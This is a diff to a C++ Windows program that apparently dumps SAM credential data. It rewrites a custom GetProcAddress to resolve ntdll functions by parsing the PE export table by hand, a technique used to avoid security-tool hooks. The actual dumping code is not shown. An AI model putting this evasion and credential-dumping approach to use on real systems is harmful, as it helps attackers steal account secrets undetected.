@@ -20,13 +20,11 @@ typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buff
 typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
 typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information; } IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
 
-typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
 typedef NTSTATUS(WINAPI* NtCreateFileFn)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
 typedef NTSTATUS(WINAPI* NtReadFileFn)(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
 typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE Handle);
 typedef NTSTATUS(WINAPI* NtWriteFileFn)(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
 
-NtReadVirtualMemoryFn NtReadVirtualMemory;
 NtCreateFileFn NtCreateFile;
 NtReadFileFn NtReadFile;
 NtCloseFn NtClose;
@@ -601,50 +599,26 @@ BOOL save_files_locally(const std::vector<BYTE>& sam_data, const std::vector<BYT
 
 // Custom implementation of GetProcAddress
 void* CustomGetProcAddress(void* pDosHdr, const char* func_name) {
-    int exportrva_offset = 136;
-    HANDLE hProcess = (HANDLE)-1;
     // DOS header (IMAGE_DOS_HEADER)->e_lfanew
-    DWORD e_lfanew_value = 0;
-    SIZE_T aux = 0;
-    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + 0x3C, &e_lfanew_value, sizeof(e_lfanew_value), &aux);
+    DWORD e_lfanew_value = *(DWORD*)((BYTE*)pDosHdr + 0x3C);
     // NT Header (IMAGE_NT_HEADERS)->FileHeader(IMAGE_FILE_HEADER)->SizeOfOptionalHeader
-    WORD sizeopthdr_value = 0;
-    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + 20, &sizeopthdr_value, sizeof(sizeopthdr_value), &aux);
+    WORD sizeopthdr_value = *(WORD*)((BYTE*)pDosHdr + e_lfanew_value + 20);
     // Optional Header(IMAGE_OPTIONAL_HEADER64)->DataDirectory(IMAGE_DATA_DIRECTORY)[0]->VirtualAddress
-    DWORD exportTableRVA_value = 0;
-    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + exportrva_offset, &exportTableRVA_value, sizeof(exportTableRVA_value), &aux);
+    DWORD exportTableRVA_value = *(DWORD*)((BYTE*)pDosHdr + e_lfanew_value + 136); // 24 + 112
+
     if (exportTableRVA_value != 0) {
-        // Read NumberOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->NumberOfNames
-        DWORD numberOfNames_value = 0;
-        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x18, &numberOfNames_value, sizeof(numberOfNames_value), &aux);
-        // Read AddressOfFunctions: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfFunctions
-        DWORD addressOfFunctionsVRA_value = 0;
-        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x1C, &addressOfFunctionsVRA_value, sizeof(addressOfFunctionsVRA_value), &aux);
-        // Read AddressOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNames
-        DWORD addressOfNamesVRA_value = 0;
-        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x20, &addressOfNamesVRA_value, sizeof(addressOfNamesVRA_value), &aux);
-        // Read AddressOfNameOrdinals: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNameOrdinals
-        DWORD addressOfNameOrdinalsVRA_value = 0;
-        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x24, &addressOfNameOrdinalsVRA_value, sizeof(addressOfNameOrdinalsVRA_value), &aux);
-        void* addressOfFunctionsRA = (BYTE*)pDosHdr + addressOfFunctionsVRA_value;
-        void* addressOfNamesRA = (BYTE*)pDosHdr + addressOfNamesVRA_value;
-        void* addressOfNameOrdinalsRA = (BYTE*)pDosHdr + addressOfNameOrdinalsVRA_value;
-        for (int i = 0; i < (int)numberOfNames_value; i++) {
-            DWORD functionAddressVRA = 0;
-            NtReadVirtualMemory(hProcess, addressOfNamesRA, &functionAddressVRA, sizeof(functionAddressVRA), &aux);
-            void* functionAddressRA = (BYTE*)pDosHdr + functionAddressVRA;
-            char functionName[256];
-            NtReadVirtualMemory(hProcess, functionAddressRA, functionName, strlen(func_name) + 1, &aux);
+        IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)pDosHdr + exportTableRVA_value);
+        DWORD numberOfNames = exportDir->NumberOfNames;
+        DWORD* addressOfFunctions = (DWORD*)((BYTE*)pDosHdr + exportDir->AddressOfFunctions);
+        DWORD* addressOfNames = (DWORD*)((BYTE*)pDosHdr + exportDir->AddressOfNames);
+        WORD* addressOfNameOrdinals = (WORD*)((BYTE*)pDosHdr + exportDir->AddressOfNameOrdinals);
+        for (DWORD i = 0; i < numberOfNames; i++) {
+            char* functionName = (char*)((BYTE*)pDosHdr + addressOfNames[i]);
             if (strcmp(functionName, func_name) == 0) {
-                WORD ordinal = 0;
-                NtReadVirtualMemory(hProcess, addressOfNameOrdinalsRA, &ordinal, sizeof(ordinal), &aux);
-                void* functionAddress;
-                NtReadVirtualMemory(hProcess, (BYTE*)addressOfFunctionsRA + ordinal * 4, &functionAddress, sizeof(functionAddress), &aux);
-                uintptr_t maskedFunctionAddress = (uintptr_t)functionAddress & 0xFFFFFFFF;
-                return (BYTE*)pDosHdr + (DWORD_PTR)maskedFunctionAddress;
+                WORD ordinal = addressOfNameOrdinals[i];
+                DWORD functionRVA = addressOfFunctions[ordinal];
+                return (BYTE*)pDosHdr + functionRVA;
             }
-            addressOfNamesRA = (BYTE*)addressOfNamesRA + 4;
-            addressOfNameOrdinalsRA = (BYTE*)addressOfNameOrdinalsRA + 2;
         }
     }
     return NULL;
@@ -653,16 +627,7 @@ void* CustomGetProcAddress(void* pDosHdr, const char* func_name) {
 
 // Initialize functions
 void InitializeNTFunctions() {
-    // You only need to use GetModuleHandle/LoadLibraryA and GetProcAddress to get NtReadVirtualMemory's address (https://github.com/ricardojoserf/MemorySnitcher)
     HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-    NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtdll, "NtReadVirtualMemory");
-    if (!NtReadVirtualMemory) {
-        printf("[-] Error: NtReadVirtualMemory address could not be calculated\n");
-        exit(1);
-    }
-
-    // Get the rest of addresses from NtReadVirtualMemory's address
-    NtCreateFile = (NtCreateFileFn)CustomGetProcAddress(hNtdll, "NtCreateFile");
     NtCreateFile = (NtCreateFileFn)CustomGetProcAddress(hNtdll, "NtCreateFile");
     NtReadFile = (NtReadFileFn)CustomGetProcAddress(hNtdll, "NtReadFile");
     NtWriteFile = (NtWriteFileFn)CustomGetProcAddress(hNtdll, "NtWriteFile");
